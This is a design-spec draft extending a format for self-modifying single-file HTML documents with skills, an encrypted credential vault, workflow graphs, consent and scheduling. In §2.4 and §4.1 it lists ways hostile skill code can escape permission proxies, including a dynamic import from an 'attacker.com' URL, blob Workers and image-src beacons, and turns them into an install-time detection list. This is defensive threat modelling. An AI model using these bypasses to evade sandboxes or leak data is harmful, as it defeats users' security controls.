# re-write-able: actions, skills, and workflows

*A design extension proposing what a re-writeable can do beyond modifying itself.*

*Draft v0.4 — resolves the v0.3 review's major issue (§2.4 shadow-surface honesty) by committing to defense-in-depth proxies with install-time review as the trust anchor, supported by an install-dialog static-analysis pass (§4.1). Adds Worker-mode skills as a deferred future direction (§11.12). Addresses the smaller items: default trigger (§5.1), user-clicked Run scope (§5.3), extended execution mutex (§5.4), persistent cost counter (§5.7), vault API labeling (§3.2), sub-workflow idb scoping (§8.2). Open seams listed explicitly in §11; merges into the main spec when those settle.*

---

## 0. Why this exists

The base spec (v0.10) defines what a re-writeable is: a single `.html` file that renders itself, stores itself in IndexedDB, modifies itself through an embedded agent, and commits itself back to disk. The agent's role is bounded — it edits the document.

This extension proposes the next layer up. The same LLM that rewrites the document can take actions beyond the document — post to a blog, fetch an RSS feed, save to a file, send an email — when given a vocabulary of **skills** and (optionally) a **workflow graph** that orchestrates them. With those additions, a re-writeable can also be:

- A **tool** with action verbs (a document that can post itself to your blog)
- A **workflow** with a visual graph (a Yahoo-Pipes-style flow as a single HTML file)
- An **agent** with skills, memory, workflows, and the ability to rewrite its own workflow

These three are not three different formats. They are the same format with different content. A single rwa can be all of them at once.

The architectural pieces from v0.10 — bootstrap, document, IndexedDB stores, the bus, the LLM connection, the FSA commit flow — carry through unchanged. This extension adds:

- A **skill library** that lives in a runtime-managed IDB store, with a viewer rwa for editing
- A **credential vault** scoped by user-declared namespaces, not by origin
- A **skill installation flow** that treats install as the privileged moment, with declared permissions, install-time code review, and a static-analysis pass to make review effective
- A **workflow document type** that renders as a node graph and is edited via a dedicated graph protocol
- A **trigger-determined persistence model** for self-modifications — manual trigger can persist via ⌘S, all other triggers produce ephemeral adaptations
- A **fork-on-share variant** for documents that carry state and capability

The constraint that does all the work in v0.10 — *one file, no server, no account, no install* — applies to every addition. The phrase "the server is convenience, not custody" (§10) is the north star; anything that violates it is rejected.

---

## 1. The agent realization

A re-writeable with self-modification (v0.10) plus skills plus workflows plus memory in IDB plus the ability to rewrite its own workflow satisfies every working definition of *agent*: it perceives (reads state), decides (LLM call), acts (skills), and remembers (IDB).

This is a recognition, not a redesign. The pieces compose without architectural disruption. What changes is the positioning — and that's a choice, not an architectural requirement. Three positioning paths exist:

**Document-first.** Present the format as documents that can rewrite themselves and (incidentally) carry workflows and skills. Trust model stays simple. Risk: under-sells what's actually here.

**Agent-first.** Present the format as the first portable agent file. Larger claim, larger upside. Risk: invites comparison with platform agents on dimensions the format isn't optimizing for (multi-tenant safety, telemetry, vendor support).

**Document-first now, agent-second later.** Ship the capability quietly. When the community builds genuinely agentic rwa's and shows them off, the agent label arrives by demonstration rather than by announcement. This is how spreadsheets became programming environments and HyperCard became a game engine.

This document specs the architecture. Working position absent contrary evidence: **document-first**. See §11.6.

---

## 2. Skills

### 2.1 What a skill is

A skill is a local capability that a re-writeable can invoke. Each skill carries:

- A **name** — stable identifier (e.g. `publish-to-blog`)
- A **version** — semantic version (`1.2.0`), used for compatibility (§2.5)
- A **description** — a sentence the LLM reads to decide if the skill applies
- An **input schema** — typed fields the skill accepts; each field may be marked `sensitive: true` to indicate it should be redacted in run history and never published in fork-on-share
- An **output schema** — typed fields the skill returns; each field may be marked `sensitive: true` with the same effect. Sensitivity is *declared per field*, not inferred from input flow.
- A **permissions manifest** — declared and best-effort enforced (§4.2; see §2.4 for the enforcement model)
- An **execution mode** — current direction: `default` only in v0.4. Future `worker` mode for stronger isolation is deferred (§11.12).
- An **implementation** — JavaScript that runs in the runtime context, subject to the permission manifest
- An optional **vault namespace** — which credential bucket the skill needs (§3)

Two contracts matter. The **interface** (name, version, description, schemas) is what documents see. The **implementation** is local to the user. A document declaring "I want to publish to a blog" matches against any local skill that satisfies the interface, regardless of what the implementation actually talks to (WordPress, Ghost, Mastodon, a static-site git push).

This is the same model as Claude's skill system and macOS "Open With" — the document carries intent; the host provides capability.

### 2.2 Where skills live

Skills live in a **runtime-managed IDB store**, `rwa_skill_library`, scoped per-origin. The store is *not* a normal document store — documents do not write to it, only the runtime does, and only through the skill installation flow (§4).

A viewer re-writeable, `skill-library.html`, provides a UI for browsing, editing, and installing skills. The viewer is one possible UI; the actual skill data lives in the IDB store and is always available regardless of whether the viewer is open. A cron-launched workflow accesses the library directly through `runtime.skills.*`; no viewer tab is needed.

The bus topic `skills:*` is runtime-reserved. Documents cannot publish into it; the runtime is the only writer. The library viewer reads through the API, not the bus.

**Hosted shares and library scope.** The library is per-origin. Local files (the null origin under `file://`) share one library. Hosted shares each get their own origin (e.g. `<short>.rewritable.<host>/`), so a workflow opened from a share URL sees an *empty* library and cannot access the recipient's installed skills. This is the right security behavior: the recipient downloads the file to local disk first, opens it from `file://`, and only then does it have access to their library. The runtime surfaces this transition explicitly when a workflow is opened from a hosted share with required skills it cannot resolve.

### 2.3 How skills are invoked

Three invocation paths:

1. **By name, from document JavaScript.** `await runtime.skills.invoke('publish-to-blog', { title, body })`. Direct and programmatic. Used when the document is essentially a script with a UI.
2. **By natural language, through the LLM.** The user presses a new keystroke — current direction: **⌘J** ("do"), distinct from **⌘K** ("edit") — and types intent. The LLM sees the list of available skills and their descriptions, picks one (or chains several), and invokes them. Used when the document is conversational, or when the user prefers intent over invocation.
3. **By graph, from a workflow.** A workflow node is a skill invocation; running the workflow runs the chain. See §5.

Consent is layered (§4.4 has the full model):

- **Installation consent** (high friction, one-time): user reviews the skill's code and permissions before it enters the library.
- **Invocation consent** (per-document or per-session, depending on sensitivity): users approve a document's first use of a sensitive skill; trivial skills (`compute` permission only) may not prompt at all.
- **Workflow manifest consent** (one prompt per workflow): a workflow declares its skill list as a manifest; the user grants the whole set on first run rather than receiving N first-time prompts in a chain.

### 2.4 Calling-skill identity, and the permission enforcement model

Permission enforcement (§4.2) requires the runtime to know *which skill* is calling `runtime.vault.get(...)`, `fetch(...)`, or any other capability API. JavaScript has no native call-site identity. The runtime resolves this by issuing **per-skill bound API surfaces** at skill load time: each skill receives its own `runtime.vault`, `runtime.bus`, `runtime.fs`, `runtime.skills`, and related objects, closed over its identity and permission manifest. The runtime also **shadows the standard capability globals** — `fetch`, `XMLHttpRequest`, `WebSocket`, `EventSource`, `navigator.sendBeacon`, `indexedDB`, `showOpenFilePicker`, `showSaveFilePicker`, `showDirectoryPicker`, and similar — in the skill's execution scope, replacing each with a permission-checked proxy.

**This mechanism is defense-in-depth, not a sandbox.** Scope shadowing has known limitations in JavaScript:

- Dynamic `import('https://attacker.com/x.js')` resolves against the platform's module loader, not the skill's scope.
- `new Worker(URL.createObjectURL(new Blob([code])))` creates a worker with its own fresh global scope where the runtime's shadowing has no effect.
- DOM-side network access — `new Image(); img.src = url`, `<video>.src = url`, `<audio>.src = url` — uses element loaders that bypass `fetch` entirely.
- `<iframe srcdoc="...">` injected into a document creates a separate browsing context.
- `postMessage` to an opener or parent crosses into a different scope's globals.

A motivated adversarial skill author can route around the proxies. The runtime should detect and block what it reasonably can, but the proxies are **not a hard isolation boundary against deliberate evasion.**

**The trust anchor is the install-time review** (invariant 10). When a skill enters the library, the user has seen its complete code, approved its declared permission manifest, and accepted responsibility for having reviewed it for capability access outside the declaration. The install dialog supports this review with a basic static-analysis pass that flags proxy-bypassing patterns explicitly (§4.1). The boundary line is human inspection of code, supported by tooling — not runtime enforcement of declarations against adversarial intent.

The declared permission manifest serves three roles:

1. **Documentation at install time.** The user sees what the skill says it needs and can compare that against what the code does. The static-analysis pass in §4.1 makes divergences visible.
2. **Best-effort runtime enforcement.** The proxies catch a skill that accidentally calls `fetch` to the wrong host, or whose helper library reaches into the vault on an unauthorized namespace. They protect against accident, bugs, and well-intentioned overreach — not against deliberate evasion.
3. **A contract the skill author accepts.** Declaring narrow permissions and then routing around them is a contract violation that the runtime catches in common cases and that future spec revisions may catch more comprehensively through stricter static analysis.

Skills that genuinely need adversarial-grade isolation — third-party skills from sources of unclear trust, especially — can opt into a future `execution: 'worker'` mode where the skill runs in a dedicated Web Worker with no DOM access, no synchronous platform APIs, and a tightly controlled message-passing interface to runtime capabilities. Worker-mode provides a real isolation boundary at the cost of restricted ergonomics. v0.4 commits only to the existence of this future mode; the design (message-passing contract, supported APIs, ergonomic tradeoffs) is deferred (§11.12). For v0.4, all skills run with the defense-in-depth proxies and rely on install-time review as the trust anchor.

The recipient of a shared workflow that wants to "publish to a blog" never receives the publisher's credentials, nor the publisher's choice of blog platform. They receive an intent that resolves against their own skill library, their own vault namespaces, on their own machine.

### 2.5 Skill versioning

Skills version semantically. A workflow's skill manifest pins major versions of its dependencies:

```javascript
{
  required_skills: [
    { name: 'publish-to-blog', major: 1 },
    { name: 'fetch-rss', major: 2 },
  ]
}
```

The library keys skills by `(name, major)`, so multiple major versions of the same skill coexist. The runtime resolves at workflow load:

- Required `(name, major)` present in library, equal or higher minor → use it.
- Required `(name, major)` present, lower minor → use it; warn if any input field referenced by the workflow is missing.
- Required `(name, major)` absent → workflow opens in read-only mode; runtime offers to install, or to remap to another installed major (with a compatibility warning).
- Multiple installed minors at the same major → use highest installed minor.

Skill authors bump major on breaking input/output schema changes; minor on additive changes; patch on implementation-only changes. Workflows that need a specific patch (e.g. for a bug fix) can pin tighter via optional `min_patch`.

---

## 3. The credential vault

### 3.1 The vault is namespace-scoped

The vault is a separate IndexedDB database, `rwa_vault`. Its access boundary is the **namespace**, not the origin. Under `file://`, all rwa files share the null origin, so an origin-scoped vault would be readable by every document on the machine — exactly the inverse of what's wanted.

Vault entries are keyed by namespace and field:

```javascript
{ namespace: 'wordpress-personal', field: 'api_token', value: '<encrypted>' }
{ namespace: 'wordpress-personal', field: 'site_url',  value: '<encrypted>' }
{ namespace: 'mastodon-mty',       field: 'token',     value: '<encrypted>' }
```

Skills declare which namespace they need at install time. The user approves the namespace declaration during installation review (§4). Skills cannot read from namespaces they don't hold. Multiple skills that hold the same approved namespace share its credentials.

**Granting access to an existing namespace is its own decision.** When a new skill requests a namespace that already holds credentials, the install dialog (§4.1) lists the skills currently using that namespace. The user grants or refuses with full visibility of who else holds the namespace.

A document cannot create a skill with arbitrary namespace access. The installation flow surfaces the requested namespace, and the user explicitly grants it.

### 3.2 The vault API

```javascript
runtime.vault = {
  set(namespace, field, value),        // skill-callable; namespace must match the calling skill's manifest
  get(namespace, field),               // skill-callable; returns null if locked or namespace unauthorized
  has(namespace, field),               // skill-callable
  namespaces(),                        // skill-callable: returns namespaces this skill is approved for
  unlock(passphrase),                  // host-context-only; not exposed through the per-skill bound runtime.vault
  lock(),                              // host-context-only; not exposed through the per-skill bound runtime.vault
  status,                              // 'locked' | 'unlocked' | 'empty'
};
```

Skill-callable methods enforce per-skill identity (§2.4): a skill can only `get`/`set` against namespaces it is approved for. `unlock`/`lock` are host-context-only — they live on the runtime's full `runtime.vault`, not on the per-skill bound proxies, the same way `runtime.skills.install` is not exposed (§4.3). Vault locking is a user action through the library viewer or runtime UI, never a skill action.

An unauthorized skill-call returns null and logs a permission denial event (visible in the library viewer).

### 3.3 The vault never travels

The vault has a hard rule that survives every other feature in this extension: **vault contents never leave the machine they were created on, regardless of how the containing document is shared or exported.** Fork-on-share, export, embed, bus publication, library export — the vault is opaque to all of them.

A skill that needs a credential on the recipient's machine triggers the recipient's vault. If the recipient hasn't populated the relevant namespace, the skill surfaces a "vault namespace `<name>` is empty; populate it from the library viewer" message rather than failing silently.

### 3.4 Vault cryptography

- **Key derivation**: Argon2id with a per-vault salt stored alongside the encrypted entries.
- **Encryption**: AES-GCM, per-entry IV, authenticated.
- **Key cache**: derived key held in memory only; cleared on lock, on tab focus loss for >N minutes (current direction: 30), and on tab close. In headless mode the focus-based lifecycle is moot because there is no UI — see §7.3 for the environment-variable passphrase boundary that takes its place.
- **Lost passphrase recovery**: not built in. A forgotten passphrase wipes the vault contents; credentials must be re-entered from their source systems. This is intentional. Recovery mechanisms in client-only systems become attack surfaces.

*Specific Argon2id parameters (memory cost, iterations, parallelism) are deliberately not pinned here. They want a separate review pass against a current threat model rather than a guess in a design doc — see §11.8.*

---

## 4. Skill installation and permissions

Skill code, by design, runs with elevated privilege (vault, network, FSA, bus). **The privileged moment is installation, not invocation.** Trust is anchored when the code enters the library, not every time it executes — and not by the per-skill API proxies, which provide defense-in-depth rather than a sandbox (§2.4).

### 4.1 The installation flow

Skills are added to the library via the library viewer (`skill-library.html`). Three install sources:

- **Generated by ⌘K in the library viewer.** User describes the skill they want; the LLM generates an implementation.
- **Imported from a shared skill file.** A small `.rwa-skill.json` artifact carrying a single skill's manifest and implementation, exchanged the same way rwa documents are.
- **Edited in place by the user.** Direct authoring in the library viewer's editor.

In all three cases, install requires explicit user action (an "Install" button), not just code generation or import. Until install completes, the skill is a **draft**.

**Drafts.** Drafts live in the same `rwa_skill_library` store with `status: 'draft' | 'installed'`. A draft can be invoked from the library viewer for testing, but only with `compute` permission — the runtime denies network, vault, FSA, and bus access to drafts regardless of what they declare. This lets the user verify that the skill's logic is structurally correct before granting it real capability. Drafts are not visible to documents (they cannot be invoked via `runtime.skills.invoke`); only the library viewer can run them.

**The install dialog** shows:

- The complete skill code, syntax-highlighted, readable.
- The **permissions manifest** (§4.2) the skill declares.
- The **vault namespace** the skill wants (if any), with one of two messages:
  - *New namespace*: "This will create a new vault namespace `<name>` for this skill."
  - *Existing namespace*: "Namespace `<name>` already holds credentials used by `<list of skills>`. Granting access lets this skill read those credentials."
- The **input/output schemas**, including sensitive-field markers.
- A **capability scan** of the skill code — a basic static-analysis pass flagging proxy-bypassing patterns (§2.4): uses of `XMLHttpRequest`, `new Image`, `new Worker`, dynamic `import`, `<iframe>` creation, srcdoc assignment, `postMessage`, element `.src` assignments to remote URLs, and similar. Each flagged pattern is surfaced with: "Note: this skill uses `<pattern>`; the permission manifest does not constrain this directly. Review the code." This is what makes the install-time review (the actual trust anchor per invariant 10) effective.
- A diff against the existing version if installing an update.

The user accepts the entire dialog, or doesn't. No "install with reduced permissions" — if the user doesn't grant a permission, the skill doesn't install. The skill can then be edited (to drop the offending capability) and re-reviewed.

### 4.2 Permission tiers

Each skill declares its capabilities as a manifest. The runtime enforces these at every API boundary via the per-skill bound API proxies (§2.4) on a best-effort basis — adversarial evasion is not blocked, but accidental overreach and bugs are.

| Permission | Declaration | Best-effort enforces |
|---|---|---|
| `compute` | Implicit (all skills) | Data manipulation only — no I/O |
| `network:<domains>` | List of origin patterns | `fetch` to those domains only (other network paths flagged at install per §4.1) |
| `vault:<namespace>` | Single namespace | Read/write that vault namespace only |
| `fsa:<patterns>` | Glob patterns | FSA operations under matching paths |
| `bus:<topics>` | Topic patterns (read, write, both) | Bus operations on matching topics |
| `idb:<store>` | Single document IDB store | Read/write that store in the running container's IDB (see §8.2 for sub-workflow scoping) |

A skill that wants to `fetch` arbitrary URLs needs `network:*`, and the install dialog surfaces that as a wildcard with a stronger warning. Most legitimate skills are narrowly scoped (`network:api.wordpress.com`, `vault:wordpress-personal`) and the install UI presents this scoping clearly.

**Pattern syntax** for each tier (exact hostname vs. wildcard vs. path, glob vs. regex, write-vs-read scoping on bus topics) is deferred to v0.5 — see §11.10. The patterns still matter under the defense-in-depth framing: they inform install-time disclosure, constrain the common case, and document the contract. They're just not a cage against adversarial intent.

### 4.3 The back door is closed

Skills cannot install other skills. The `runtime.skills.install(...)` API is not exposed to skill code at all — only the library viewer (running in the host context with library-edit privilege) can call it. A self-modifying workflow (§6) cannot invoke a skill that adds a new skill, because no such skill can exist. The privilege boundary holds at the level the spec actually defends: installation as the privileged moment.

Workflows that need new skills surface them as missing-skill errors at load time, prompting the user to install via the viewer. There is no path from running code to "the library now has a new skill" without a user-mediated review.

### 4.4 Sensitivity and consent under load

Per-invocation consent prompting is calibrated by permissions:

- **`compute`-only skills**: no prompt on first invocation. Pure data manipulation; consent is satisfied by install review.
- **Skills with any I/O permission**: prompt on first invocation per document, with "remember for this document" / "remember for this session" / "ask each time" options.
- **Workflows**: declare a `skill_manifest` listing every skill they invoke. On first run, the user reviews and grants the entire manifest once. Subsequent runs (and cron runs) do not prompt — the manifest is the consent record.

This resolves the "10 skills, 10 first-time prompts" failure mode without watering down the consent model for one-off invocations.

---

## 5. Workflows

### 5.1 The workflow document type

A workflow re-writeable's primary content is a **directed graph** of skill invocations. The visual representation is the rendered view. Editing the workflow — via ⌘K — modifies the graph through a dedicated protocol (§5.2).

The graph lives in IndexedDB under a runtime-reserved store, `rwa_workflow`. Shape:

```javascript
{
  version: '1.0',
  nodes: [
    {
      id: '7k3p2m9q',
      type: 'skill',                   // skill | primitive | input | output
      skill: 'fetch-rss',
      skill_version: { major: 2 },
      primitive: 'split',
      config: { url: 'https://…' },
      position: { x, y },              // optional; runtime auto-lays-out when omitted
    },
    // …
  ],
  edges: [
    { from: nodeId, to: nodeId, predicate: null | '<expr>', kind: 'normal' | 'error' },
  ],
  trigger: 'manual' | 'on_open' | 'cron:<expr>' | 'on_change:<bus_key>',
  skill_manifest: [
    { name: 'fetch-rss',       major: 2 },
    { name: 'publish-to-blog', major: 1 },
  ],
  concurrency: 'skip' | 'queue' | 'parallel',
  history_cap: 100,
}
```

**When `trigger` is omitted, the runtime defaults to `manual`.** This matters more under v0.3's invariant 12 (which keys persistence off trigger value) than it did before — workflows without a declared trigger are user-driven and behave that way.

When `position` is omitted on a `graph_add_node` call, the runtime auto-lays-out: place the new node at a small offset from the most recently added node, snapping to a coarse grid to keep the canvas readable.

Graph size note: each node and edge serializes into `INLINE_DOC` at commit time. The viewer surfaces a soft warning above 100 nodes recommending decomposition into sub-workflows (§8.2). There is no hard cap, but workflows of that size belong in a database, not an inline snapshot.

### 5.2 The graph editing protocol

⌘K on a workflow rwa dispatches `rwa-graph/1`, a protocol parallel to `rwa-edit/1`. The agent receives the graph as structured JSON plus the user's instruction and returns one or more graph operations:

- `graph_add_node({ type, skill?, primitive?, config, position? })`
- `graph_remove_node({ id })`
- `graph_modify_node({ id, changes })`
- `graph_add_edge({ from, to, predicate?, kind? })`
- `graph_remove_edge({ from, to })`
- `graph_modify_edge({ from, to, changes })`
- `graph_set_trigger({ trigger })` — see §6 for restrictions

The runtime applies the operations atomically. A failed operation rolls back the entire batch and surfaces the error. The previous graph state is pushed onto `rwa_undo` per v0.10's undo model; ⌘Z walks the graph back.

The graph is not text and is not edited as text. Serializing graphs to text and back through a text-edit protocol was considered and rejected — JSON round-tripping is fragile in LLM output and the failure modes (a missing comma destroying half the graph) are exactly the ones a dedicated protocol prevents.

A document rwa with no `rwa_workflow` store dispatches `rwa-edit/1` as before. A workflow rwa dispatches `rwa-graph/1`. A hybrid rwa (prose + an embedded workflow) dispatches both, scoped to the part of the document the user's instruction targets — current direction is to route by what's in focus, with a fallback to a disambiguating prompt.

### 5.3 Execution semantics

Three trigger modes (default: `manual`, §5.1):

1. **Manual.** Open the file, click Run. The file is a viewable, editable artifact; execution is explicit.
2. **On open.** Opening the file executes the workflow. Powerful but security-sensitive — requires a clear consent dialog the first time a document opens with `on_open` trigger, with an "open without running" affordance.
3. **External trigger.** A scheduled (cron) or event-driven invocation from outside the browser. The workflow declares its intended trigger; actual scheduling is set up by the user on their OS (§7).

Current direction: ship **manual** first. Add **on open** when the consent UX is solid. **External trigger** is supported by the format from the start but requires the user's own OS-level setup.

**User-clicked Run** — what counts. User-clicked Run is always treated as a manual run regardless of the workflow's declared trigger. "User-clicked" here means specifically clicks on the *runtime's* Run button — the button surfaced by the runtime UI (typically in the viewer chrome or status bar). Document-provided UI that invokes `runtime.workflow.run()` from skill or document JavaScript is treated as **programmatic invocation**, which falls under the declared trigger's persistence rules (§6.2). The runtime can attest to what happens in its own UI; it cannot attest to user intent behind a document-driven invocation, so the safer default is to treat document-driven runs as autonomous.

Within a run, execution is async and non-blocking. Each node returns a Promise; edges enforce ordering; the runtime walks the graph topologically. The visual representation highlights the currently-running node (or nodes, during a split). Errors halt the affected branch and surface in the visual; an `error`-kind edge on a node redirects failure to a recovery branch.

### 5.4 Concurrency and the execution mutex

A workflow can be triggered while a previous run is still in flight (user re-clicks Run; cron fires while the previous run is still working); a user can be ⌘K-editing the graph when a cron trigger fires. The runtime extends v0.10's BroadcastChannel-based modify-mutex into a **per-workflow execution mutex** that covers three operations:

1. **Workflow runs** (any trigger).
2. **User ⌘K edits on the workflow graph.**
3. **Programmatic graph modifications** via `runtime.modify({ scope: 'graph' })`.

While any one of these is in progress, the others queue or skip per the `concurrency` policy:

- **`skip` (default)** — a new trigger while a run is in progress, or an autonomous-trigger run while the user is editing, is ignored with a log entry.
- **`queue`** — new triggers queue up to a per-workflow cap; default cap is 3, after which further triggers are dropped. Queue is FIFO. The library viewer exposes a "cancel queued runs" affordance — a queued run can be removed before it starts, but an in-flight run cannot be cancelled mid-execution.
- **`parallel`** — new triggers start in parallel runs. Workflows opting in must declare their state usage is concurrency-safe (the runtime cannot verify this). Concurrent writes to the same `runtime.workflow.state` key are last-write-wins with no atomicity guarantee.

One rule holds regardless of `concurrency`: **while the user is editing the workflow graph (⌘K open or modifications pending in the viewer), autonomous-trigger runs are always skipped** with a log entry. The user's edit takes precedence even under `concurrency: 'parallel'`. This prevents the race where a cron run fires mid-edit and both try to write to `rwa_workflow`.

### 5.5 State across runs

```javascript
runtime.workflow = {
  state: {
    get(key),
    put(key, value),
    has(key),
    list(prefix),
  },
  run: {
    id,
    started_at,
    triggered_by: 'manual' | 'on_open' | 'cron' | 'on_change',
  },
  history,                             // last N runs; N = workflow.history_cap (default 100)
};
```

`runtime.workflow.state` backs onto a reserved IDB store, `rwa_workflow_state`, and survives across runs, commits, and sessions. A workflow that polls an RSS feed writes seen IDs here; a workflow that summarizes a daily inbox writes the last-processed timestamp here.

Run history is structured. Each run logs trigger, start/end timestamps, status, and a per-node entry recording: skill invoked, input (with fields marked `sensitive: true` redacted), output presence and any non-sensitive output fields (with `sensitive: true` output fields redacted), duration, error if any.

Workflow authors can tune `history_cap` per workflow. History entries beyond the cap are dropped FIFO.

Skill input *and* output schemas may mark fields as `sensitive: true`. The runtime redacts marked fields in run history. Fork-on-share filtering uses the same flags (§9). Sensitivity is declared per field; carry-through from sensitive inputs to outputs was considered and rejected as too magical — skill authors mark output sensitivity explicitly.

### 5.6 Failure visibility

A cron-triggered workflow that fails at 3am needs to surface that failure to its user. The runtime writes failure events to a reserved store `rwa_workflow_notifications` (a queue, capped at 100; FIFO, newest at the top of the list, oldest dropped when capped), and:

- Surfaces them in the workflow's visual representation on next open.
- Optionally emits to the OS notification system, where available (Chromium with the Notifications API + user permission).
- Optionally writes a structured log file to a user-configured FSA path.

The latter two are opt-in per workflow. "Failure" includes: skill invocation errors, vault-locked errors, missing-skill errors, timeout, and quota-exceeded events from the cost model (§5.7).

### 5.7 Cost model

LLM calls cost money. A self-modifying workflow on cron is a runaway spend risk. The runtime tracks per-workflow token usage and enforces caps:

- **Token counting**: total tokens (input + output combined, summed across calls in a run).
- **Per-run cap**: maximum tokens per single invocation. Default: 100k. Workflow can declare higher.
- **Per-day cap**: maximum tokens across all runs in a 24-hour window. Default: 500k. Workflow can declare higher; user confirms at install if the declared cap exceeds the runtime's installation-confirmation threshold (default: 1,000,000 tokens/day, runtime-configurable).
- **Soft warning**: at 80% of either cap, the runtime surfaces a notification. Workflow continues.
- **Hard stop**: at 100% of either cap, the workflow halts (or the offending self-modification step is rejected). Resumes at the next reset boundary.

**Counter location.** The per-day token counter is persistent: it lives in `rwa_workflow_state` under a runtime-reserved key (parallel to the per-24h modification counter in §6.3). This keeps the counter accurate when the run history is truncated by `history_cap` — a high-frequency cron workflow that exceeds `history_cap` within 24 hours still has an accurate per-day total.

Local-LLM fallback (Ollama, llama.cpp, etc.) is an explicit design goal but deferred (§11.7).

---

## 6. Self-modifying workflows

A workflow that modifies its own graph is qualitatively different from one that just runs. It's adaptive: it can change its own approach based on what it has learned. This is the point where the format becomes recognizable as an agent in the strong sense.

The mechanism: the workflow's own ⌘K targets the graph (via `rwa-graph/1`). What's new is that a *running node* can also invoke graph modification programmatically, via `runtime.modify(instruction)`.

### 6.1 `runtime.modify` semantics

```javascript
runtime.modify(instruction, { scope?: 'graph' | 'document' })
```

- Mutually exclusive with user-triggered ⌘K and with workflow runs via the per-workflow execution mutex (§5.4).
- Surfaces token cost to the user (counts against the per-run and per-day caps in §5.7).
- Returns a Promise that resolves when the modification is applied (or rejects with a structured error).
- Subject to the rate limits in §6.3.

`scope: 'graph'` targets the workflow graph; `scope: 'document'` targets the document body (the runtime's `rwa-edit/1` protocol). Both target legitimate modification surfaces; *neither* targets the bootstrap, which remains inaccessible to the agent (v0.10 §5.4).

### 6.2 The commit gate, by trigger

The runtime cannot reliably tell whether a given Chrome launch was a user double-click or `cron` calling `open -a "Google Chrome"`. So the spec does not ask. It asks instead **what triggered the run** — which is declared in the workflow itself and is unambiguous at runtime.

**Self-modifications persist only when the run is initiated by the manual trigger and the user explicitly commits via ⌘S.**

Concretely:

- **Manual trigger (user-clicked Run on the runtime's UI, §5.3).** Self-modifications during the run land in IDB. The user can ⌘Z (walks the graph back) and ⌘S (persists to disk). Same semantics as a v0.10 document edit.
- **All other triggers (`on_open`, `cron:*`, `on_change:*`), and document-driven programmatic invocations.** Self-modifications during the run land in IDB temporarily — the workflow can adapt within the run, and downstream nodes see the adapted graph. *At run end, the graph is reset from the inline snapshot.* The IDB workflow store is rehydrated from disk. ⌘S is not offered during an autonomous run.

`rwa_workflow_state` (the data store) persists between runs as designed (§5.5). Only the workflow *structure* resets after a non-manual run.

This means:

- A cron workflow can adapt within a run; that adaptation affects the rest of the run.
- A cron workflow cannot drift across days. The agent does not gradually become a different agent without a human in the loop.
- The on-disk file is always the source of truth for what an autonomous workflow *is*.
- Determinism: the same on-disk file launched autonomously a hundred times produces a hundred runs that all start from the same graph.
- A user who *wants* a scheduled adaptation to stick pulls up the workflow manually, clicks Run on the runtime UI, lets it adapt, and ⌘S's. They are now in the loop.

The runtime enforces the rule by inspecting the workflow's declared trigger (and the call site for programmatic invocations), not by detecting headless mode. This makes invariant 12 enforceable rather than aspirational.

### 6.3 Self-modification rate limits

Two limits, both enforced by the runtime:

- **Per-run cap**: default 1 modification per run. Workflow can declare higher with user confirmation at install. Enforced in-memory during a run.
- **Per-24h cap**: default 10 modifications across all *manual-trigger* runs in a 24-hour window. Persisted in `rwa_workflow_state` under a runtime-reserved key so it survives sessions. Does not apply to non-manual runs because their modifications don't persist anyway (§6.2); the bound for autonomous runs is the per-run cap plus the cost model (§5.7).

Both caps surface in the library viewer's per-workflow statistics.

### 6.4 Hard constraints

These survive every other consideration:

- **Triggers cannot be modified by self-modification.** A `manual` workflow cannot, via the LLM, become an `on_open` workflow. Trigger changes go through `graph_set_trigger`, which `runtime.modify` does not authorize — only user ⌘K does.
- **The skill manifest cannot be expanded by self-modification.** A workflow cannot self-modify into using a skill its declared manifest doesn't include. The user-granted manifest from install time is the binding contract; self-modification works within it.
- **The bootstrap is sacrosanct.** Self-modification touches the graph in `rwa_workflow` (or the document body when `scope: 'document'`), never the runtime, the skill implementations, or the inline snapshot's structure. If the graph drifts into nonsense, reload — IDB hydrates from the snapshot.

---

## 7. Scheduling and headless execution

### 7.1 The format is the same

A workflow file is the same file regardless of how it's run. There is no "deploy to production" step. Authoring, testing, and scheduled execution all open the exact same `.html`. Only the *opener* differs. The persistence model is identical across openers (§6.2) — what changes is who initiated the run, which the workflow's trigger declaration already tells the runtime.

### 7.2 Three flavors of unattended execution

**A. Open in normal Chrome on a schedule.** `open -a "Google Chrome" workflow.html` from `cron` (Linux/macOS) or the equivalent on Windows Task Scheduler. Runs as the user, inherits logged-in browser state.

**B. Headless Chrome with a persistent profile.** `chrome --headless=new --user-data-dir=/path/to/profile workflow.html`. No window. Profile must be set up once with whatever credentials and vault state the workflow needs.

**C. A companion CLI.** Out of scope for this spec, but worth naming: an eventual `rwa run workflow.html` would wrap headless Chrome, handle vault unlocking from environment variables or an OS keychain, and surface logs in a CLI-friendly form.

In all three flavors, persistence behavior is determined by the trigger, not by which flavor was used.

### 7.3 The vault for unattended runs

A scheduled run cannot prompt for the vault passphrase. Three options:

- **Environment variable.** The passphrase lives in the cron environment. In this mode the vault key cache lifecycle (§3.4) is moot — the passphrase is supplied at process start, used for the run, and gone with the process.
- **OS keychain.** The runtime, in headless mode, fetches the passphrase from macOS Keychain / GNOME Keyring / Windows Credential Manager.
- **Unattended-mode vault.** A second, less-protected vault holds only credentials the user has explicitly marked as headless-safe.

Current direction: ship environment-variable support as the v1 answer (documented as "for trusted machines only") and add keychain integration as the runtime matures.

---

## 8. Composition

### 8.1 Skills + workflows + the bus

The cross-container bus from v0.10 (§5.7 main spec) becomes more powerful with skills and workflows in play. A workflow can read inputs from `runtime.shared.get('source:topic')`, subscribe to bus changes as an event trigger (`trigger: 'on_change:<bus_key>'`), and publish outputs for other workflows to consume.

This is the Unix-pipe model at the rwa scale: small workflows that do one thing, composed by file references and bus topics. Drop two workflow files in the same folder; one writes to `flow-a:results`, the other subscribes — a pipeline assembled by drag-and-drop. No service mesh, no API gateway, no orchestrator.

### 8.2 Workflows referencing other workflows

A workflow node can be another workflow file (referenced by path or URL). The runtime resolves the reference, embeds the sub-workflow's input/output schema, and chains accordingly.

Sub-workflow execution happens in an isolated iframe (§5.8 main spec; sandbox modes apply). Each iframe is its own rwa container with its own `rwa_<DOC_UUID>` (v0.10 §5.7). Permission scoping follows the container:

- **`idb:<store>`** resolves against the *running container's* IDB. A skill running inside a sub-workflow sees the sub-workflow's IDB. A skill running in the parent sees the parent's. Cross-container IDB access is not granted by `idb:<store>`; cross-container communication goes through the sub-bus (below). This connects §4.2's permission tier to §8.2's nesting model.
